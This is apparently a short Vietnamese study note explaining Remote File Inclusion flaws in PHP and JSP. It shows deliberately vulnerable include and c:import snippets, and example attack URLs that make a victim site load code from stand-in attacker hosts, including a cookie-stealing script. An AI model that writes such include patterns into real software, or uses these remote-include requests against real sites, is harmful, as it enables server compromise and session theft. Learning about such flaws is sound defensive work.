## Người thực hiện: Trần Ngọc Nam
## Ngày thực hiện: 17/5/2022

# Mục lục:
1. [Lỗ hổng RFI](#1)
2. [Lỗ hổng RFI trong PHP](#2)
3. [Lỗ hổng RFI trong JSP](#3)

## Lỗ hổng RFI:<a name="1"></a>
- Remote file inclusion cho phép tin tặc include và thực thi trên máy chủ mục tiêu một tệp tin được lưu trữ từ xa.
- Tin tặc có thể sử dụng RFI để chạy một mã độc trên cả máy của người dùng và phía máy chủ.
- Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ.
  
## Lỗ hổng RFI trong PHP:<a name="2"></a>
- PHP có nguy cơ cao bị tấn công RFI do việc sử dụng lệnh include rất nhiều và thiết đặt mặc định của server cũng ảnh hưởng một phần nào đó.
-  Để bắt đầu chúng ta cần tìm nơi chứa file include trong ứng dụng phụ thuộc vào dữ liệu đầu vào người dùng:
   -  Một trong những nơi chứa lỗ hổng có thể như ví dụ dưới đây, giá trị của ‘testfile’ được cung cấp bởi người dùng <code>www.victim_site.com/abc.php?testfile=example</code>.
   -  Mã nguồn PHP chứa lỗ hổng <code>$test = $_REQUEST[“testfile”];Include($test.”.php”);</code>
   -  Thông số của ‘testfile’ được lấy từ phía người dùng. Đoạn mã sẽ lấy giá trị ‘testfile’ và trực tiếp include nó vào file PHP.
   -  Sau đây là ví dụ về một hướng tấn công được sử dụng đối với đoạn mã trên <code>www.victim_site.com/abc.php?test=https://www.attacker_site.com/attack_page</code>.
   -  File “attack_page” được bao hàm vào trang có sẵn trên máy chủ và thực thi mỗi khi trang “abc.php” được truy cập. Tin tặc sẽ đưa mã độc vào “attack_page” và thực hiện hành vi độc hại.
  
## Lỗ hổng RFI trong JSP:<a name="3"></a>
- Giả sử một kịch bản nơi một trang JSP sử dụng “c:import” nhằm nhập một tên tệp tin nào đó do người dùng cung cấp vào trang JSP hiện tại thông qua biến đầu vào ‘test’: <code><c:import url=”<%= request.getParameter(“test”)%>”></code>
- Tin tắc sẽ tấn công với <code>www.victim_site.com/abc.jsp?test=https://www.attackersite.com/stealingcookie.js</code>.
- Script độc hại trong stealingcookie.js sẽ được đưa vào trang của nạn nhân và điều khiển bởi tin tặc.